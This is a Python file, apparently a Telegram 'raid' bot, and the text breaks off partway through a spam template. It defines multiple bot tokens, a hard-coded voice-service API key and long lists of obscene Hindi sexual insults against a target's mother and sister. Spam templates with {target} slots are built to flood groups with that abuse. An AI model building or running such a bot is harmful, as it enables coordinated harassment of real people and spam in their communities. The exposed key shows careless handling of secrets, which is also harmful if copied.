import asyncio
import json
import os
import random
import time
import logging
import requests
import io
from telegram import Update, ReactionTypeEmoji, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

_z = lambda *v: "".join(map(chr, v))
_X0 = _z(126,97,109,97,110,107,101,110,103)
_X1 = _z(126,97,109,97,110,107,101,110,103,118,49)
_X2 = _z(126,97,109,97,110,107,101,110,103,118,50)
_X3 = _z(126,97,109,97,110,107,101,110,103,118,51)

# ---------------------------
# CONFIG
# ---------------------------
TOKENS = [
    "8765191263:AA....",
    "8833874758:AA....",
    "8973348501:AA....",
    "8882436394:AA....",
    "8645620414:AA....",
    "8979566278:AA....",
    "8926949918:AA....",
    "8897018506:AA....",
    "8990903745:AA....",
    "8169511161:AA....",
]

OWNER_IDS = [8520322381]
ADMINS_FILE = "admin_ids.json"
GROUPS_FILE = "monitored_groups.json"
SUDO_FILE = "sudo.json"
UNAUTHORIZED_MESSAGE = "𝐁ɪɴᴀ 𝐀 ʀ 𝐘 ᴀ ɴ  𝐁ᴀᴀᴘ 𝐊 𝐏ᴇʀᴍɪꜱꜱɪᴏɴ 𝐊 𝐂ᴏᴍᴍᴀɴᴅ 𝐊ᴇꜱᴇ 𝐔ꜱᴇ 𝐊ᴀʀᴀ 𝐑ɴᴅʏᴋᴇ 𝐁ᴀᴄᴄʜᴇ ~😡🖕"

RAID_TEXTS = [
    "𝐒ᴀʏ 𝐀 ʀ 𝐘 ᴀ ɴ  𝐃ᴀᴅʏ 𓆩💗𓆪",
    "𝐖ᴏ ʙʜɪ ᴋʏᴀ ᴅɪɴ ᴛʜᴇ ᴊᴀʙ ᴛʀʏ ᴍᴀᴀ ᴍᴜᴊʜᴇ 𝐀ᴘɴᴀ 𝐂ʜᴜᴛ 𝐃ᴇᴛɪ ᴛʜɪ ʏᴀᴀʀ 💔🥀👌🏻",
    "𝐀ᴡᴀᴢ 𝐍ɪᴄʜᴇ 𝐆ᴜʟᴀᴀᴍ 🤢👇🏻",
    "𝐓ʀʏ 𝐌ᴀᴀ ɴᴇ 𝐂ʜᴜᴅɴᴇ 𝐌ᴀɪ ɢᴏʟᴅ 𝐌ᴇᴅᴀʟ 𝐉ᴇᴇᴛᴀ ᴇʏ 𝐃ᴏꜱᴛ 🤩👑",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ᴇʀᴀ 𝐋ᴜɴᴅ 🖕🏻😈",
    "𝐁ʜᴏꜱᴀᴅɪᴋᴇ 𝐀ᴘɴɪ 𝐁ᴇʜᴇɴ 𝐂ʜᴜᴅᴀ 🖕🏻😈",
    "𝐑ᴀɴᴅɪ ᴋᴇ 𝐁ᴀᴄᴄʜᴇ 𝐀ᴜᴋᴀᴛ 𝐌ᴇ 𝐑ᴇʜ 🖕🏻😈",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 🖕🏻😈",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋᴀ 𝐁ʜᴏꜱᴅᴀ ᴋʜᴏʟ ᴅᴜɴɢᴀ 🔓😈",
    "𝐁ʜᴇɴᴄʜᴏᴅ 𝐀ᴘɴɪ 𝐀ᴜᴋᴀᴛ 𝐌ᴇ 𝐑ᴇʜ 🤡💩",
    "𝐓𝐌𝐊𝐂 ᴘᴇ 𝐂ʜᴀᴘᴘᴀʟ 𝐌ᴀᴀʀᴜɴɢᴀ 👟💥",
    "𝐁ʜᴏꜱᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐊ʜᴀɴᴅᴀɴ ᴋɪ 𝐁𝐊𝐂 💀🖕🏻",
    "𝐑ᴀɴᴅɪ ᴋɪ 𝐀ᴜʟᴀᴅ ᴄʜᴜᴘ ʜᴏ ᴊᴀ 🔇😒",
    "𝐆ᴜʟᴀᴀᴍ ʜᴇɪ ᴛᴜ ᴍᴇʀᴀ ᴀʙ ᴀᴜʀ ʀᴀʜᴇɢᴀ ʙʜɪ 👑😎",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ɪʀᴄʜɪ 🌶️🖕🏻",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐏ᴀɪʀ 🦶🏻😈",
    "𝐁ʜᴏꜱᴀᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋᴀ 𝐁ʜᴏꜱᴅᴀ 🗑️😏",
    "𝐑ᴀɴᴅɪ ᴋᴀ 𝐏ɪʟʟᴀ ʜᴀɪ ᴛᴜ 🐕💩",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋᴏ 𝐁ᴀᴢᴀᴀʀ 𝐌ᴇ 𝐂ʜᴏᴅᴜɴɢᴀ 🌃😈",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐆ᴀʀᴀᴍ 𝐓ᴇʟ 🌡️🖕🏻",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴍᴇʀɪ 𝐑ᴀɴᴅɪ 💋👿",
    "𝐑ᴀɴᴅɪ ᴋᴇ 𝐁ᴀᴄᴄʜᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 🖕🏻😈",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋᴏ 𝐑ᴀᴀᴛ ʙʜᴀʀ 𝐂ʜᴏᴅᴜɴɢᴀ 🌙😈",
    "𝐑ᴀɴᴅɪ ᴋᴀ 𝐁ᴀᴄᴄʜᴀ ʜᴀɪ ᴛᴜ ꜱᴀᴀʟᴇ 🤡💀",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴛ 𝐌ᴇ 𝐌ᴇʀᴀ 𝐉ᴏᴏᴛᴀ 👞🖕🏻",
    "𝐀 ʀ 𝐘 ᴀ ɴ  𝐃ᴀᴅʏ ᴋᴀ 𝐆ᴜʟᴀᴀᴍ ʜᴀɪ ᴛᴜ 🥀😤",
    "ᴊɪꜱ ᴅɪɴ ᴛᴜ ᴘᴀɪᴅᴀ ʜᴜᴀ 𝐓ᴇʀɪ 𝐌ᴀᴀ ɴᴇ ꜱᴏᴄʜᴀ ᴛʜᴀ ᴋᴀꜱʜ ᴀʙᴏʀᴛ ᴋᴀʀ ᴅᴇᴛɪ 💀🥀",
    "𝐀ᴘɴɪ 𝐀ᴜᴋᴀᴛ ᴅᴇᴋʜ ᴋᴜᴛᴛᴇ 🐕😂",
    "𝐆ᴀʟɪ ᴋᴀ 𝐊ᴜᴛᴛᴀ ʜᴀɪ ᴛᴜ 🐕🗑️",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ɴᴇ ᴍᴜᴊʜᴇ ᴅᴇᴋʜ ᴋᴇ ꜱᴏᴄʜᴀ ᴋᴀꜱʜ ʏᴇ ᴍᴇʀᴀ ʙᴇᴛᴀ ʜᴏᴛᴀ 🫦😏",
    "𝐂ʜᴜᴘ ᴋᴀʀ 𝐌ᴀᴅᴀʀᴄʜᴏᴅ ᴛᴇʀɪ ᴀᴜᴋᴀᴛ ɴᴀʜɪ ᴍᴇʀᴇ ꜱᴀᴀᴍɴᴇ ʙᴏʟɴᴇ ᴋɪ 🤐💀",
    "𝐓ᴇʀɪ 𝐌ᴀᴀ ᴋɪ 𝐂ʜᴜᴅᴀɪ ᴍᴇ ᴊᴀʙ ᴍᴀɪ ᴛʜᴀ ᴛᴏ ᴛᴜ ᴘᴀɪᴅᴀ ʜᴜᴀ 💀😂",
    "𝐁ʜᴀɢ ʏᴀʜᴀɴ ꜱᴇ ᴋᴜᴛᴛᴇ ᴋᴇ ᴘɪʟʟᴇ 🐕💨",
    "𝐓ᴇʀɪ 𝐁ᴇʜᴇɴ ᴋɪ ꜱᴀᴅɪ 𝐌ᴇ ᴍᴇʀᴀ ʟᴜɴᴅ 💍😈",
    "𝐌ᴀᴅᴀʀᴄʜᴏᴅ ᴀᴘɴɪ 𝐌ᴀᴀ ᴍᴀᴛ ᴄʜᴜᴅᴀ 🖕🏻👹",
    "𝐁ʜᴇɴᴄʜᴏᴅ 𝐓ᴇʀɪ 𝐊ʜᴀɴᴅᴀɴ ᴋɪ 𝐁𝐊𝐂 💀🖕🏻",
    "𝐁𝐊𝐂 🦴🐕",
]

NCEMO_EMOJIS = [
    "🗿","👑","🩵","🔱","🌷","❤️‍🩹","👞","🤮","🤣","😭","💔","🥺",
    "😁","👿","🚀","🔥","🥹","😬","🙄","😎","👽","👾","😈","👹",
    "🤡","👋🏿","🤞🏿","🙀","👌🏿","🤟🏿","🐒","🦁","🐅","🦓","🐮"
]

FLAGNC_EMOJIS = [
    "🇮🇳", "🇵🇰", "🇦🇫", "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇩🇪", "🇫🇷", "🇮🇹", "🇯🇵", "🇰🇷", "🇧🇷", "🇷🇺", "🇿🇦", "🇲🇽", "🇪🇸", "🇸🇦", "🇹🇷", "🇮🇩"
]

HEARTNC_EMOJIS = [
    "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", "🤎", "💔", "❤️‍🔥", "❤️‍🩹", "❣️", "💕", "💞", "💓", "💗", "💖", "💘", "💝"
]

AESTHETICNC_EMOJIS = [
    "🕊️", "🤍", "🌸", "🎀", "🦢", "🐚", "🩰", "☁️", "✨", "🧊", "🎐", "💎", "🦋", "🍃", "🧸"
]

VEGETABLENC_EMOJIS = [
    "🥬", "🥦", "🌽", "🥕", "🫑", "🥒", "🍆", "🍅", "🥔", "🧄", "🧅", "🥜", "🫒"
]

ANIMALNC_EMOJIS = [
    "🐶", "🐱", "🐭", "🐹", "🐰", "🦊", "🐻", "🐼", "🐨", "🐯", "🦁", "🐮", "🐷", "🐸", "🐵", "🐒", "🐔", "🐧", "🐦", "🐤"
]

EXONC_TEXTS = ["💀", "🔥", "⚡", "🎯", "💥", "👑", "🔱", "💫", "⭐", "🌟", "✨", "🎀", "❤️", "🖤"]

VOICE_CHARACTERS = {
    1: {"name": "Urokodaki", "voice_id": "VR6AewLTigWG4xSOukaG"},
    2: {"name": "Kanae", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    3: {"name": "Uppermoon", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    4: {"name": "Tanjiro", "voice_id": "VR6AewLTigWG4xSOukaG"},
    5: {"name": "Nezuko", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    6: {"name": "Zenitsu", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    7: {"name": "Inosuke", "voice_id": "VR6AewLTigWG4xSOukaG"},
    8: {"name": "Muzan", "voice_id": "AZnzlk1XvdvUeBnXmlld"},
    9: {"name": "Shinobu", "voice_id": "EXAVITQu4vr4xnSDxMaL"},
    10: {"name": "Giyu", "voice_id": "VR6AewLTigWG4xSOukaG"}
}
tempest_API_KEY = "sk_e326b337242b09b451e8f18041fd0a7149cc895648e36538"

ALL_NC_TEXT = "𝐀 ʀ 𝐘 ᴀ ɴ𝐃𝐀𝐃𝐃𝐘"
ALL_SPAM_TEXT = "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 𝐏𝐀𝐈𝐑 𝐌𝐄𝐑𝐀 🔥⚡"

SPAM_TEMPLATE =  [
    "━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━\n━━━━━━━━ 💗᪲᪲᪲࣪ ִֶָ☾.ᯓᡣ𐭩🤍ྀི    ✝ 𝐀ɴᴛᴀ𝐑 𝐌ᴀɴ𝐓ᴀʀ 𝐒ʜ𝐀ɪ𝐓ᴀɴ𝐈 𝐊ʜᴏ𝐏ᴀ𝐃𝐀 {hater} 𝐆ᴀ𝐑ɪ𝐁 𝐊ɪ 𝐀ᴍᴍ𝐈 𝐊ᴀ 𝐊ᴀ𝐋𝐀 𝐁ʜᴏs𝐃ᴀ  ━━━━━━━━",
    "🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻_____________\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻___________🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻_________________🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾\n⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆\n🦅 𝐌αᴛᴋҽ 𝐌ҽ 𝐍ʜι 𝐓ʜα 𝐏αɳι 💦 {target} 🕷   𝐊ι 𝐌αα -- 𝐁αнαη 𝐑αη∂ιуσ 𝐊ι 𝐑αηι 🧊❤️‍🔥🥵👈🏻______________",
    "________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝙄 𝙆𝙃𝙊𝙋𝘿𝘼 {target}⚡⚡ 𝙆𝙄 𝙈𝘼 𝙆𝘼 𝙆𝘼ʟALA 𝘽𝙃𝙊𝙎𝘿𝘼࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝙄 𝙆𝙃𝙊𝙋𝘿𝘼 {target}⚡⚡ 𝙆𝙄 𝙈𝘼 𝙆𝘼 𝙆𝘼ʟALA 𝘽𝙃𝙊𝙎𝘿𝘼࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 